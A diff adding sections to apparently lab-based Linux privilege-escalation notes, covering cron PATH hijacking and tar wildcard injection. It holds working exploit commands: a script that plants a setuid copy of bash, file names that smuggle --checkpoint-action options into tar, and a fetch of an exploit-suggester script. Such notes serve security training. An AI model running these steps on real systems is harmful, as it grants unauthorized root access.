@@ -89,6 +89,49 @@ Linux VM
 crontab -l 
 cat /etc/crontab
 
+#### with the path
+Detection
+
+Linux VM
+
+1. In command prompt type: cat /etc/crontab
+2. From the output, notice the value of the “PATH” variable.
+
+Exploitation
+
+Linux VM
+
+1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+2. In command prompt type: chmod +x /home/user/overwrite.sh
+3. Wait 1 minute for the Bash script to execute.
+4. In command prompt type: /tmp/bash -p
+5. In command prompt type: id
+
+#### with the wirldcard
+
+Detection
+
+Linux VM
+
+1. In command prompt type: cat /etc/crontab
+2. From the output, notice the script “/usr/local/bin/compress.sh”
+3. In command prompt type: cat /usr/local/bin/compress.sh
+4. From the output, notice the wildcard (*) used by ‘tar’.
+
+Exploitation
+
+Linux VM
+
+1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
+2. touch /home/user/--checkpoint=1
+3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+4. Wait 1 minute for the Bash script to execute.
+5. In command prompt type: /tmp/bash -p
+6. In command prompt type: id
+7. 
+
 # kernel exploit
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
 chmod +x les.sh
